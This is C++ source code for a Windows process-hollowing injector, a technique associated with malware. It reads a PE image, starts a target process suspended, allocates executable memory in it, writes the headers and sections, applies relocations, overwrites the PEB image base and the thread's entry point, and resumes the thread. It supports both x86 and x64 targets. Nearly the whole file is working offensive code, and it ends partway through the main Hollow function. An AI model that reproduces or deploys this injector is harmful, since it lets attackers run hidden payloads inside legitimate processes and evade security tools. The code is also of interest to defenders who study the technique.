#include <ProcessHollowing.h>


/**
 * Function to retrieve the PE file content.
 * \param lpFilePath : path of the PE file.
 * \return : address of the content in the explorer memory.
 */
HANDLE Process::GetFileContent(const LPSTR lpFilePath)
{
	const HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		 printf("[-] An error occured when trying to open the PE file !\n");
		CloseHandle(hFile);
		return nullptr;
	}

	const DWORD dFileSize = GetFileSize(hFile, nullptr);
	if (dFileSize == INVALID_FILE_SIZE)
	{
		printf("[-] An error occured when trying to get the PE file size !\n");
		CloseHandle(hFile);
		return nullptr;
	}

	const HANDLE hFileContent = HeapAlloc(GetProcessHeap(), 0, dFileSize);
	if (hFileContent == INVALID_HANDLE_VALUE)
	{
		printf("[-] An error occured when trying to allocate memory for the PE file content !\n");
		CloseHandle(hFile);
		CloseHandle(hFileContent);
		return nullptr;
	}

	const BOOL bFileRead = ReadFile(hFile, hFileContent, dFileSize, nullptr, nullptr);
	if (!bFileRead)
	{
		printf("[-] An error occured when trying to read the PE file content !\n");
		CloseHandle(hFile);
		if (hFileContent != nullptr)
			CloseHandle(hFileContent);

		return nullptr;
	}

	CloseHandle(hFile);
	return hFileContent;
}

/**
 * Function to check if the image is a valid PE file.
 * \param lpImage : PE image data.
 * \return : TRUE if the image is a valid PE else no.
 */
BOOL Process::IsValidPE(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->Signature == IMAGE_NT_SIGNATURE)
		return TRUE;

	return FALSE;
}

/**
 * Function to check if the image is a x86 executable.
 * \param lpImage : PE image data.
 * \return : TRUE if the image is x86 else FALSE.
 */
BOOL Process::IsPE32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
		return TRUE;

	return FALSE;
}

/**
 * Function to retrieve the PEB address and image base address of the target process x86.
 * \param lpPI : pointer to the process infromation.
 * \return : if it is failed both address are nullptr.
 */
ProcessAddressInformation Process::GetProcessAddressInformation32(const PPROCESS_INFORMATION lpPI)
{
	LPVOID lpImageBaseAddress = nullptr;
	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;
	Wow64GetThreadContext(lpPI->hThread, &CTX);
	const BOOL bReadBaseAddress = ReadProcessMemory(lpPI->hProcess, (LPVOID)(uintptr_t)(CTX.Ebx + 0x8), &lpImageBaseAddress, sizeof(DWORD), nullptr);
	if (!bReadBaseAddress)
		return ProcessAddressInformation{ nullptr, nullptr };

	return ProcessAddressInformation{ (LPVOID)(uintptr_t)CTX.Ebx, lpImageBaseAddress };
}

/**
 * Function to retrieve the PEB address and image base address of the target process x64.
 * \param lpPI : pointer to the process infromation.
 * \return : if it is failed both address are nullptr.
 */
ProcessAddressInformation Process::GetProcessAddressInformation64(const PPROCESS_INFORMATION lpPI)
{
	LPVOID lpImageBaseAddress = nullptr;
	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;
	GetThreadContext(lpPI->hThread, &CTX);
	const BOOL bReadBaseAddress = ReadProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageBaseAddress, sizeof(UINT64), nullptr);
	if (!bReadBaseAddress)
		return ProcessAddressInformation{ nullptr, nullptr };

	return ProcessAddressInformation{ (LPVOID)CTX.Rdx, lpImageBaseAddress };
}

/**
 * Function to retrieve the subsystem of a PE image x86.
 * \param lpImage : data of the PE image.
 * \return : the subsystem charateristics.
 */
DWORD Process::GetSubsytem32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	return lpImageNTHeader->OptionalHeader.Subsystem;
}

/**
 * Function to retrieve the subsystem of a PE image x64.
 * \param lpImage : data of the PE image.
 * \return : the subsystem charateristics.
 */
DWORD Process::GetSubsytem64(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	return lpImageNTHeader->OptionalHeader.Subsystem;
}

/**
 * Function to retrieve the subsytem of a process x86.
 * \param hProcess : handle of the process.
 * \param lpImageBaseAddress : image base address of the process.
 * \return : the process subsystem charateristics.
 */
DWORD Process::GetSubsystemEx32(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
{
	constexpr IMAGE_DOS_HEADER ImageDOSHeader = {};
	const BOOL bGetDOSHeader = ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImageDOSHeader, sizeof(IMAGE_DOS_HEADER), nullptr);
	if (!bGetDOSHeader)
	{
		 printf("[-] An error is occured when trying to get the target DOS header.\n");
		return -1;
	}

	constexpr IMAGE_NT_HEADERS32 ImageNTHeader = {};
	const BOOL bGetNTHeader = ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)lpImageBaseAddress + ImageDOSHeader.e_lfanew), (LPVOID)&ImageNTHeader, sizeof(IMAGE_NT_HEADERS32), nullptr);
	if (!bGetNTHeader)
	{
		 printf("[-] An error is occured when trying to get the target NT header.\n");
		return -1;
	}

	return ImageNTHeader.OptionalHeader.Subsystem;
}

/**
 * Function to retrieve the subsytem of a process x64.
 * \param hProcess : handle of the process.
 * \param lpImageBaseAddress : image base address of the process.
 * \return : the process subsystem charateristics.
 */
DWORD Process::GetSubsystemEx64(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
{
	constexpr IMAGE_DOS_HEADER ImageDOSHeader = {};
	const BOOL bGetDOSHeader = ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImageDOSHeader, sizeof(IMAGE_DOS_HEADER), nullptr);
	if (!bGetDOSHeader)
	{
		 printf("[-] An error is occured when trying to get the target DOS header.\n");
		return -1;
	}

	constexpr IMAGE_NT_HEADERS64 ImageNTHeader = {};
	const BOOL bGetNTHeader = ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)lpImageBaseAddress + ImageDOSHeader.e_lfanew), (LPVOID)&ImageNTHeader, sizeof(IMAGE_NT_HEADERS64), nullptr);
	if (!bGetNTHeader)
	{
		 printf("[-] An error is occured when trying to get the target NT header.\n");
		return -1;
	}

	return ImageNTHeader.OptionalHeader.Subsystem;
}

/**
 * Function to clean and exit target process.
 * \param lpPI : pointer to PROCESS_INFORMATION of the target process.
 * \param hFileContent : handle of the source image content.
 */
void Process::CleanAndExitProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hFileContent)
{
	if (hFileContent != nullptr && hFileContent != INVALID_HANDLE_VALUE)
		HeapFree(GetProcessHeap(), 0, hFileContent);

	if (lpPI->hThread != nullptr)
		CloseHandle(lpPI->hThread);

	if (lpPI->hProcess != nullptr)
	{
		TerminateProcess(lpPI->hProcess, -1);
		CloseHandle(lpPI->hProcess);
	}
}

/**
 * Function to clean the target process.
 * \param lpPI : pointer to PROCESS_INFORMATION of the target process.
 * \param hFileContent : handle of the source image content.
 */
void Process::CleanProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hFileContent)
{
	if (hFileContent != nullptr && hFileContent != INVALID_HANDLE_VALUE)
		HeapFree(GetProcessHeap(), 0, hFileContent);

	if (lpPI->hThread != nullptr)
		CloseHandle(lpPI->hThread);

	if (lpPI->hProcess != nullptr)
		CloseHandle(lpPI->hProcess);
}

/**
 * Function to check if the source image has a relocation table x86.
 * \param lpImage : content of the source image.
 * \return : TRUE if the image has a relocation table else FALSE.
 */
BOOL Process::HasRelocation32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return TRUE;

	return FALSE;
}

/**
 * Function to check if the source image has a relocation table x64.
 * \param lpImage : content of the source image.
 * \return : TRUE if the image has a relocation table else FALSE.
 */
BOOL Process::HasRelocation64(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return TRUE;

	return FALSE;
}

/**
 * Function to retrieve the IMAGE_DATA_DIRECTORY reloc of a x86 image.
 * \param lpImage : PE source image.
 * \return : 0 if fail else the data directory.
 */
IMAGE_DATA_DIRECTORY Process::GetRelocAddress32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	return { 0, 0 };
}

/**
 * Function to retrieve the IMAGE_DATA_DIRECTORY reloc of a x64 image.
 * \param lpImage : PE source image.
 * \return : 0 if fail else the data directory.
 */
IMAGE_DATA_DIRECTORY Process::GetRelocAddress64(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	return { 0, 0 };
}

/**
 * Function to write the new PE image and resume the process thread x86.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
BOOL Process::RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (LPVOID)(uintptr_t)lpImageNTHeader32->OptionalHeader.ImageBase, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		 printf("[-] An error is occured when trying to allocate memory for the new image.\n");
		return FALSE;
	}

	 printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, (LPVOID)lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		 printf("[-] An error is occured when trying to write the headers of the new image.\n");
		return FALSE;
	}

	 printf("[+] Headers write at : 0x%p\n", (LPVOID)(DWORD64)lpImageNTHeader32->OptionalHeader.ImageBase);

	for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			 printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			return FALSE;
		}

		 printf("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
	}

	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = Wow64GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		 printf("[-] An error is occured when trying to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpImageNTHeader32->OptionalHeader.ImageBase, sizeof(DWORD), nullptr);
	if (!bWritePEB)
	{
		 printf("[-] An error is occured when trying to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

	const BOOL bSetContext = Wow64SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		 printf("[-] An error is occured when trying to set the thread context.\n");
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}

/**
 * Function to write the new PE image and resume the process thread x64.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
BOOL Process::RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		 printf("[-] An error is occured when trying to allocate memory for the new image.\n");
		return FALSE;
	}

	 printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		 printf("[-] An error is occured when trying to write the headers of the new image.\n");
		return FALSE;
	}

	 printf("[+] Headers write at : 0x%p\n", (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase);

	for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			 printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			return FALSE;
		}

		 printf("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
	}

	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		 printf("[-] An error is occured when trying to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
		 printf("[-] An error is occured when trying to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

	const BOOL bSetContext = SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		 printf("[-] An error is occured when trying to set the thread context.\n");
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}

/**
 * Function to fix relocation table and write the new PE image and resume the process thread x86.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
BOOL Process::RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		 printf("[-] An error is occured when trying to allocate memory for the new image.\n");
		return FALSE;
	}

	 printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

	const DWORD DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader32->OptionalHeader.ImageBase;

	lpImageNTHeader32->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;
	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		 printf("[-] An error is occured when trying to write the headers of the new image.\n");
		return FALSE;
	}

	 printf("[+] Headers write at : 0x%p\n", lpAllocAddress);

	const IMAGE_DATA_DIRECTORY ImageDataReloc = GetRelocAddress32(lpImage);
	PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

	for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
			lpImageRelocSection = lpImageSectionHeader;

		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			 printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			return FALSE;
		}

		 printf("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
	}

	if (lpImageRelocSection == nullptr)
	{
		 printf("[-] An error is occured when trying to get the relocation section of the source image.\n");
		return FALSE;
	}

	 printf("[+] Relocation section : %s\n", (char*)lpImageRelocSection->Name);

	DWORD RelocOffset = 0;

	while (RelocOffset < ImageDataReloc.Size)
	{
		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto lpImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD PatchedAddress = 0;

			ReadProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);

			PatchedAddress += DeltaImageBase;

			WriteProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);

		}
	}

	 printf("[+] Relocations done.\n");

	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = Wow64GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		 printf("[-] An error is occured when trying to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpAllocAddress, sizeof(DWORD), nullptr);
	if (!bWritePEB)
	{
		 printf("[-] An error is occured when trying to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

	const BOOL bSetContext = Wow64SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		 printf("[-] An error is occured when trying to set the thread context.\n");
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}

/**
 * Function to fix relocation table and write the new PE image and resume the process thread x64.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
BOOL Process::RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		 printf("[-] An error is occured when trying to allocate memory for the new image.\n");
		return FALSE;
	}

	 printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

	const DWORD64 DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader64->OptionalHeader.ImageBase;

	lpImageNTHeader64->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;
	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		 printf("[-] An error is occured when trying to write the headers of the new image.\n");
		return FALSE;
	}

	 printf("[+] Headers write at : 0x%p\n", lpAllocAddress);

	const IMAGE_DATA_DIRECTORY ImageDataReloc = GetRelocAddress64(lpImage);
	PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

	for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
			lpImageRelocSection = lpImageSectionHeader;


		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			 printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			return FALSE;
		}

		 printf("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
	}

	if (lpImageRelocSection == nullptr)
	{
		 printf("[-] An error is occured when trying to get the relocation section of the source image.\n");
		return FALSE;
	}

	 printf("[+] Relocation section : %s\n", (char*)lpImageRelocSection->Name);

	DWORD RelocOffset = 0;

	while (RelocOffset < ImageDataReloc.Size)
	{
		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto lpImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD64 PatchedAddress = 0;

			ReadProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);

			PatchedAddress += DeltaImageBase;

			WriteProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);

		}
	}

	 printf("[+] Relocations done.\n");

	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		 printf("[-] An error is occured when trying to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
		 printf("[-] An error is occured when trying to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

	const BOOL bSetContext = SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		 printf("[-] An error is occured when trying to set the thread context.\n");
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}

LPVOID Process::GetFileContentFromBytes(const std::vector<std::uint8_t>& data)
{
	LPVOID lpContent = HeapAlloc(GetProcessHeap(), 0, data.size());
	if (lpContent) {
		memcpy(lpContent, data.data(), data.size());
	}
	return lpContent;
}

BOOL Process::Hollow(const std::vector<uint8_t> Bytes, const LPSTR lpTargetProcess)
{
	if(Bytes.empty())
	{
		printf("[-] The PE file content is empty.\n");
		return FALSE;
	}

	if(!lpTargetProcess)
	{
		printf("[-] The target process path is invalid.\n");
		return FALSE;
	}


	auto lpSourceImage = (LPSTR)GetFileContentFromBytes(Bytes);
	if (lpSourceImage == nullptr) {
		 printf("[-] Failed to allocate memory for the PE file content.\n");
		 return FALSE;
	}

	const LPVOID hFileContent = lpSourceImage;
	if (hFileContent == nullptr)
		return FALSE;

	 printf("[+] PE file content : 0x%p\n", (LPVOID)(uintptr_t)hFileContent);

	const BOOL bPE = IsValidPE(hFileContent);
	if (!bPE) {
		 printf("[-] The PE file is not valid!\n");
		if (hFileContent != nullptr)
			HeapFree(GetProcessHeap(), 0, hFileContent);
		return FALSE;
	}

	STARTUPINFOA SI;
	PROCESS_INFORMATION PI;

	ZeroMemory(&SI, sizeof(SI));
	SI.cb = sizeof(SI);
	ZeroMemory(&PI, sizeof(PI));

	const BOOL bProcessCreation = CreateProcessA(lpTargetProcess,
		nullptr,
		nullptr,
		nullptr,
		TRUE,
		CREATE_SUSPENDED,
		nullptr,
		nullptr,
		&SI,
		&PI);

	if (!bProcessCreation) {
		 printf("[-] An error occurred when trying to create the target process!\n");
		CleanAndExitProcess(&PI, hFileContent);
		return FALSE;
	}

	BOOL bTarget32;
	IsWow64Process(PI.hProcess, &bTarget32);

	ProcessAddressInformation ProcessAddressInformation = { nullptr, nullptr };
	if (bTarget32) {
		ProcessAddressInformation = GetProcessAddressInformation32(&PI);
		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr) {
			 printf("[-] An error occurred when trying to get the image base address of the target process!\n");
			CleanAndExitProcess(&PI, hFileContent);
			return FALSE;
		}
